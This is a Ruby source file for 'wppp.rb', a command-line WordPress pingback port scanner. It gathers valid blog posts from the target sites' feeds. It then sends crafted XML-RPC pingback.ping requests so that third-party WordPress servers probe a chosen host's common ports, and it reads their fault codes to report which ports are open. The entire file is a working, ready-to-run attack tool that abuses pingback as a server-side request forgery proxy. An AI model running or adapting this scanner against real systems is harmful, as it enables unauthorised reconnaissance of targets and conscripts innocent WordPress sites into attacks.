#!/usr/bin/env ruby

#
# Robin Wood - robin@digininja.org
# Changes:
# * After version 0.5 typhoeus changed the option follow_location to followlocation
#   for some reason so have to do a version check
# * Added command line options and usage
#

require "getoptlong"
require "typhoeus"

opts = GetoptLong.new(
  [ '--help', '-h', "-?", GetoptLong::NO_ARGUMENT ],
  [ '--target', "-t" , GetoptLong::REQUIRED_ARGUMENT ],
  [ '--verbose', "-v" , GetoptLong::NO_ARGUMENT ]
)

# Display the usage
def usage
  puts"Wordpress Pingback Port Scanner

Usage: wppp.rb [OPTION] ... XMLRPCS
  --help, -h: show help
  --target, -t X: the target to scan - default localhost
  --verbose, -v: verbose

  XMLRPCS: a space separated list of XMLRPCs to use for scanning

"
  exit
end

def generate_pingback_xml (target, valid_blog_post)
  xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
  xml << "<methodCall>"
  xml << "<methodName>pingback.ping</methodName>"
  xml << "<params>"
  xml << "<param><value><string>#{target}</string></value></param>"
  xml << "<param><value><string>#{valid_blog_post}</string></value></param>"
  xml << "</params>"
  xml << "</methodCall>"
  xml
end

def get_pingback_request(xml_rpc, target, blog_post)
  pingback_xml = generate_pingback_xml(target, blog_post)
  if Gem.loaded_specs["typhoeus"].version >= Gem::Version.create(0.5)
    pingback_request = Typhoeus::Request.new(xml_rpc,
        :followlocation => true,
        :timeout => 5000,
        :method => :post,
        :body => pingback_xml
    )
  else
    pingback_request = Typhoeus::Request.new(xml_rpc,
        :follow_location => true,
        :timeout => 5000,
        :method => :post,
        :body => pingback_xml
    )
  end
  pingback_request
end

def get_valid_blog_post(xml_rpcs)
  blog_posts = []
  xml_rpcs.each do |xml_rpc|
    url = xml_rpc.sub(/\/xmlrpc\.php$/, "")
    # Get valid URLs from Wordpress Feed
    feed_url = "#{url}/feed/"
    response = Typhoeus::Request.get(feed_url)
    links = response.body.scan(/<link>([^<]+)<\/link>/i)
    if response.code != 200 or links.nil?
      raise("No valid blog posts found for xmlrpc #{xml_rpc}")
    end
    links.each do |link|
      temp_link = link[0]
      # Test if pingback is enabled for extracted link
      pingback_request = get_pingback_request(xml_rpc, "http://www.google.com", temp_link)
      @hydra.queue(pingback_request)
      @hydra.run
      pingback_response = pingback_request.response
      # No Pingback for post enabled: <value><int>33</int></value>
      pingback_disabled_match = pingback_response.body.match(/<value><int>33<\/int><\/value>/i)
      if pingback_response.code == 200 and pingback_disabled_match.nil?
        puts "Found valid post under #{temp_link}"
        blog_posts << {:xml_rpc => xml_rpc, :blog_post => temp_link}
        break
      end
    end
  end
  blog_posts
end

def generate_requests(xml_rpcs, target)
  %w(21 22 25 53 80 106 110 143 443 3306 8443 9999).each do |i|
    random = (0...8).map{65.+(rand(26)).chr}.join
    xml_rpc_hash = xml_rpcs.sample
    url = "#{target}:#{i}/#{random}/"
    pingback_request = get_pingback_request(xml_rpc_hash[:xml_rpc], url, xml_rpc_hash[:blog_post])
    pingback_request.on_complete do |response|
      # Closed: <value><int>16</int></value>
      closed_match = response.body.match(/<value><int>16<\/int><\/value>/i)
      if closed_match.nil?
        puts "Port #{i} is open"
        if @verbose
          puts "##################################"
          puts xml
          puts response.body
        end
      else
        puts "Port #{i} is closed"
      end
    end
    @hydra.queue(pingback_request)
  end
end

@verbose = false
target = "http://localhost"
xml_rpcs = []

begin
  opts.each do |opt, arg|
    case opt
      when '--help'
        usage
      when "--target"
        if arg !~ /^http/
          target = "http://" + arg
        else
          target = arg
        end
      when "--verbose"
        @verbose = true
      else
        raise("Unknown option #{opt}")
    end
  end
rescue GetoptLong::InvalidOption
  puts
  usage
  exit
end

if ARGV.length == 0
  puts
  usage
  exit 1
end

# Parse XML RPCs
ARGV.each do |site|
  if site !~ /^http/i
    xml_rpcs << "http://" + site
  else
    xml_rpcs << site
  end
end

@hydra = Typhoeus::Hydra.new(:max_concurrency => 10)

puts "Getting valid blog posts for pingback..."
hash = get_valid_blog_post(xml_rpcs)
puts "Starting portscan..."
generate_requests(hash, target)
@hydra.run
